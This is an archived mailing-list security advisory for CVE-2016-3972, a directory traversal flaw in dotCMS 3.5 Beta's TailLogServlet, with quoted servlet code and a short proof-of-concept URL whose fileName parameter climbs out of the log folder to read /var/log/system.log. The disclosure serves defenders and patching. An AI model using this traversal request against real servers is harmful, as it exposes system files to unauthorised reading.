X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3645" "Friday" "8" "April" "2016" "11:07:35" "+0800" "xiong piaox" "yahoo860201@gmail.com" "<CAA0JNpTZm42a_6D4TdOb=8H56y7dd-fewOCg3CmCA-a8TN=e8g@mail.gmail.com>" "177" "[oss-security] [CVE-2016-3972]DotCMS Directory traversal vulnerability" nil nil nil "4" "2016040803:07:35" "[oss-security] [CVE-2016-3972]DotCMS Directory traversal vulnerability" (number mark "U       yahoo860201@ Apr  8  177/3645  " thread-indent "\"[oss-security] [CVE-2016-3972]DotCMS Directory traversal vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 22407 invoked by uid 550); 8 Apr 2016 03:09:01 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 22028 invoked from network); 8 Apr 2016 03:07:47 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:date:message-id:subject:from:to:cc;
        bh=64BAJmo99YyOnklku5yMI7LRAB6yuPiUL4nuMX5mPEo=;
        b=mHXZIO/MrRDEbpzdeuRZN3CiqrrDgG+HMVr8N0veT0bhNG+eFuQXajxluvBbBazhkf
         PR0TVqeUCeu7lN8QoV4unCjXebKnVJW30fF6OBeyf0lQBA/cig57ieiEoaDtGxda79vQ
         uiZJ79jT498jg/RGLUtiScA5A4mUVF4drSVSwM/gt8ruochsjbDk+ffIlcam4PPeIm5c
         mYbTh4F5SxnP6ahp4fgLWzp0+xkSCzQ8QzAyA+EGRDPJ/P2G2vas6nm/0uVMwEZ1daoj
         ZdRF36QaSYDv+dLhcw8WGYIfo18v1rCQC0vtsFRVJ0C0RKC+JyimvOaEX6uA1Lpe0F/A
         J3Sw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:date:message-id:subject:from:to:cc;
        bh=64BAJmo99YyOnklku5yMI7LRAB6yuPiUL4nuMX5mPEo=;
        b=ZZ/lsN52R03cIvB/Y6T542gi4v46vWtfMeP7WZ8CGaOzRP8GqYR18tUhNzRLFPAdSo
         dChzyJTwNBctMfQ0awYTpMdVPW9wrMVANqSCFg52+NwzjVFs1j0QcHM/d+VLXB9jl2Mw
         KpIYJ6WxqdJ+Nlv37O+br+ONneea8Jx0khKYiPVvY66NjGDhH8se9FyyLIBfrj1oa/7Z
         gzogy0WaYBGVGik8NabyRG0ojnJKoDh+udrXX1vM/pcb87Rp2lv6+pqb8DRzyjb8CacB
         BEb3pOCXq5ctu3N1RE8t6OXPA7/uiW2vmIKZF92FFHs8VgUJyf65hhLLmSrDoWshokA8
         DKoA==
X-Gm-Message-State: AD7BkJIk4wV2tayZG4bxQaUqlsZ6Wed00PE10PeTbM358IzOE/Am1/NokGuU9KtDRD9IaqKghDUT/o/quz5i8Q==
MIME-Version: 1.0
X-Received: by 10.129.85.197 with SMTP id j188mr3625702ywb.28.1460084855843;
 Thu, 07 Apr 2016 20:07:35 -0700 (PDT)
Date: Fri, 8 Apr 2016 11:07:35 +0800
Message-ID: <CAA0JNpTZm42a_6D4TdOb=8H56y7dd-fewOCg3CmCA-a8TN=e8g@mail.gmail.com>
From: xiong piaox <yahoo860201@gmail.com>
To: fulldisclosure@seclists.org
Cc: bugs@securitytracker.com, bugtraq@securityfocus.com, 
	oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary=001a113f1ec22cb1d7052ff07fe0
Subject: [oss-security] [CVE-2016-3972]DotCMS Directory traversal vulnerability

--001a113f1ec22cb1d7052ff07fe0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

Advisory: DotCMS Directory traversal vulnerability

Author: Piaox From Pingan Product Safety Group

Email: xiongyaofu351@pingan.com.cn

Affected Version: dotCMS 3.5 Beta(the latest version)



=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D

Vulnerability Description

Recetly, I found a Directory traversal vulnerability in =E2=80=98DotCMS'
program,  DotCMS is widely used in many companies.



Vulnerable file is: =E2=80=9Ccom.dotmarketing.servlets.taillog.TailLogServl=
et.class=E2=80=9D

File file =3D *null*;

    String tailLogLofFolder =3D *Config*.*getStringProperty*(
"TAIL_LOG_LOG_FOLDER", "./dotsecure/logs/");

    *try*

    {

      *if* (!tailLogLofFolder.endsWith(File.separator)) {

        tailLogLofFolder =3D tailLogLofFolder + File.separator;

      }

      file =3D *new* File(*FileUtil*.*getAbsolutlePath*(tailLogLofFolder +
fileName));

    }

    *catch* (Exception e)

    {

      *Logger*.*error*(getClass(), "unable to open log file '" +
tailLogLofFolder + fileName + "' please set the config variable
TAIL_LOG_LOG_FOLDER correctly");

    }

    *if* ((file =3D=3D *null*) || (!file.exists()))

    {

      response.sendError(403);

      *AdminLogger*.*log*(*TailLogServlet*.*class*, "service", "Someone
tried to use the TailLogServlet to display a file not in the logs directory"
);

      *return*;

    }

    String regex =3D *Config*.*getStringProperty*("TAIL_LOG_FILE_REGEX");

//WEB-INF/classes/dotmarketing-config.properties:TAIL_LOG_FILE_REGEX=3D.*\.=
log$|.*\.out$

    *if* (!*UtilMethods*.*isSet*(regex)) {

      regex =3D "!.*";

    }

*if* (!Pattern.compile(regex).matcher(fileName).matches()) {

//Only detects whether the file extension .log end,lead =EF=BC=8Ccaused Dir=
ectory
traversal vulnerability.

      *return*;

    }

    response.setContentType("text/html;charset=3DUTF-8");



    ServletOutputStream out =3D response.getOutputStream();



    out.print("<html><head><title>dotCMS Log</title><style
type=3D'text/css'>@import '/html/css/dot_admin.css';</style><script>var
working =3Dfalse;function
doS(){if(!working){working=3Dtrue;if(parent.document.getElementById('scroll=
Me').checked){dh=3Ddocument.body.scrollHeight;ch=3Ddocument.body.clientHeig=
ht;if(dh>ch){moveme=3Ddh-ch;window.scrollTo(0,moveme);}}working=3Dfalse;}}<=
/script></head><body
class=3D'tailerBody'>");



    out.flush();



    *Tailer* tailer =3D *null*;

    *long* startPosition =3D file.length() - 5000L < 0L ? 0L : file.length()
- 5000L;



    *MyTailerListener* listener =3D *new* MyTailerListener(*null*);

    listener.*handle*("Tailing " + fileName);

    listener.*handle*("----------------------------- ");

    tailer =3D *new* *Tailer*(file, listener, 1000L);

    tailer.*setStartPosition*(startPosition);

    *MyTailerThread* thread =3D *new* *MyTailerThread*(tailer);



    String name =3D *null*;

    *for* (*int* i =3D 0; i < 1000; i++)

    {

      name =3D "LogTailer" + i + ":" + fileName;

      Thread t =3D *ThreadUtils*.*getThread*(name);

      *if* (t =3D=3D *null*) {

        *break*;

      }

      *if* (i > 100) {

        *throw* *new* ServletException("Too many Logger threads");

      }

    }



=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D

POC && EXP

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D

1. Login

2.
http://localhost:8080/dotTailLogServlet/?fileName=3D../../../../../../../..=
/var/log/system.log

--001a113f1ec22cb1d7052ff07fe0--
